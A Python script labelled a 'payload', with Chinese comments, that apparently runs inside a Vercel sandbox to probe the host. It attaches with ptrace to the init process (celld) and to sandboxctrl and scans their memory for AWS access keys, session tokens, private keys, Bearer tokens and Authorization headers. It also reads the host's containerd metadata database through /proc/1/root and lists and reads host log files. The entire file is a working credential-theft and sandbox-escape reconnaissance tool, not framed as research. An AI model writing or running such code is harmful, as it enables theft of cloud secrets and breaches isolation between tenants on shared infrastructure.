# -*- coding: utf-8 -*-
"""v153 payload: celld 二进制 strings + celld 堆扫描(waitpid版) + drive_id 定向
输出 /vercel/sandbox/v153c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v153c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def readp(pid, name, n=8000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def find_procs(comm):
    out = []
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    if open('/proc/%s/comm' % d).read().strip() == comm:
                        out.append(int(d))
                except Exception:
                    pass
    except Exception:
        pass
    return out


def mem_scan(pid, kws, tag='', max_bytes=128 * 1024 * 1024, max_found=30, ctx=200):
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        try:
            os.waitpid(pid, os.WUNTRACED)
        except Exception:
            pass
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        targets = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            base = int(a, 16)
            size = int(b, 16) - base
            perm = parts[1]
            if perm[0] != 'r' or size < 4096:
                continue
            if base >= 0xc000000000 or (perm[1] == 'w' and size < 200 * 1024 * 1024):
                targets.append((base, size, perm))
        log('%s heap regions=%d' % (tag, len(targets)))
        total = 0
        found = 0
        for base, size, perm in targets:
            if total >= max_bytes or found >= max_found:
                break
            want = min(size, max_bytes - total)
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(want)
                mf.close()
                total += len(chunk)
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(kw, chunk):
                        s = max(0, m.start() - ctx)
                        seg = chunk[s:m.end() + ctx]
                        printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                        if printable * 10 < len(seg) * 3:
                            continue
                        log('%s MEM %s @0x%x: %r' % (tag, kw, base + m.start(), seg))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s heap scan done bytes=%d found=%d' % (tag, total, found))
        try:
            libc.ptrace(17, pid, 0, 0)
        except Exception:
            pass
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


def bin_grep(path, kws, max_size=300 * 1024 * 1024, max_hits=40, ctx=80):
    """大文件流式 grep: kws 为 bytes 列表, 输出命中上下文"""
    try:
        size = os.path.getsize(path)
        log('BIN %s size=%d' % (path, size))
        if size > max_size:
            log('BIN skip too big')
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                seg = data[s:m.end() + ctx]
                printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                if printable * 10 < len(seg) * 4:
                    continue
                log('BIN %s @0x%x: %r' % (kw, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('BIN %s done hits=%d' % (path, hits))
    except Exception as e:
        log('BIN EXC %s %s' % (path, e))


# ============ 1: celld 二进制 strings (drive_id 格式线索) ============
log('=== 1 celld bin ===')
try:
    exe = os.readlink('/proc/1/exe')
    log('celld exe=%s' % exe)
    bin_grep(exe,
             [rb'drive[_A-Za-z]*', rb'[Dd]rive[I][Dd]', rb'allocate_drive', rb'WaitForDrive',
              rb'retrieveDrive', rb'AcquireDrive', rb'hvd_[A-Za-z0-9_]{4,40}', rb'dri_[A-Za-z0-9_]{4,40}',
              rb'GET /[a-zA-Z0-9_/.-]{3,60}', rb'/v[0-9]/[a-zA-Z0-9_/.-]{3,60}',
              rb'https?://[a-zA-Z0-9_.-]{4,60}'],
             max_hits=50, ctx=90)
except Exception as e:
    log('celld bin EXC %s' % e)

# ============ 2: celld 堆扫描 (waitpid 版) ============
log('=== 2 celld heap ===')
try:
    mem_scan(1,
             [rb'AKIA[0-9A-Z]{16}', rb'ASIA[0-9A-Z]{16}', rb'x-amz-security-token', rb'aws_access',
              rb'aws_secret', rb'-----BEGIN [A-Z ]*PRIVATE KEY-----', rb'Bearer eyJ',
              rb'Authorization:\s*\S{10,80}', rb'hvd_[A-Za-z0-9_]{4,40}', rb'dri_[A-Za-z0-9_]{4,40}',
              rb'drive[_a-z]*id[_a-z]*["\s:=]{1,3}\S{4,60}'],
             tag='celld', max_bytes=120 * 1024 * 1024, max_found=30, ctx=220)
except Exception as e:
    log('celld heap EXC %s' % e)

# ============ 3: sandboxctrl drive_id 定向 ============
log('=== 3 sc drive ===')
pids = find_procs('sandboxctrl')
if pids:
    mem_scan(pids[0],
             [rb'hvd_[A-Za-z0-9_]{4,40}', rb'dri_[A-Za-z0-9_]{4,40}', rb'drive[_a-z]*id[_a-z]*["\s:=]{1,3}\S{4,60}',
              rb'AKIA[0-9A-Z]{16}', rb'x-amz-', rb'Bearer eyJ'],
             tag='sc', max_bytes=64 * 1024 * 1024, max_found=25, ctx=200)
else:
    log('no sandboxctrl')

# ============ 4: meta.db 全量字符串 ============
log('=== 4 meta.db ===')
try:
    meta_db = R + '/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
    data = open(meta_db, 'rb').read()
    log('meta size=%d' % len(data))
    strs = set()
    for m in re.finditer(rb'[\x20-\x7e]{8,}', data):
        s = m.group().decode(errors='replace')
        if any(k in s for k in ['hvd', 'dri', 'drive', 'Drive', 'sandbox', 'cell', 'volume',
                                'mount', 'snapshot', 'container', 'workload', 'image',
                                'lease', 'bolt', 'sha256', 'ecr', 'vercel', 'hive']):
            strs.add(s)
    for s in sorted(strs)[:120]:
        log('META %s' % s)
except Exception as e:
    log('meta EXC %s' % e)

# ============ 5: sandboxctrl 日志/打开文件 ============
log('=== 5 sc files ===')
if pids:
    pid = pids[0]
    try:
        for fd in sorted(os.listdir('/proc/%d/fd' % pid))[:80]:
            try:
                tgt = os.readlink('/proc/%d/fd/%s' % (pid, fd))
                if tgt.startswith('/') and 'socket' not in tgt and 'pipe' not in tgt and 'anon' not in tgt:
                    log('sc fd %s -> %s' % (fd, tgt))
            except Exception:
                pass
    except Exception as e:
        log('sc fds EXC %s' % e)
    # 日志目录
    for p in [R + '/var/log', R + '/var/log/vercel', R + '/opt/vercel', R + '/vercel/logs']:
        try:
            entries = sorted(os.listdir(p))[:40]
            log('LS %s = %s' % (p, entries))
        except Exception as e:
            log('ls %s EXC %s' % (p, e))
    # 读常见日志文件尾
    for lp in [R + '/var/log/vercel/sandboxctrl.log', R + '/var/log/sandboxctrl.log',
               R + '/opt/vercel/sandboxctrl.log', R + '/vercel/logs/sandboxctrl.log']:
        try:
            data = open(lp, 'rb').read(8000)
            log('LOG %s len=%d: %r' % (lp, len(data), data[-1500:]))
        except Exception:
            pass

log('V153_DONE')
f.close()
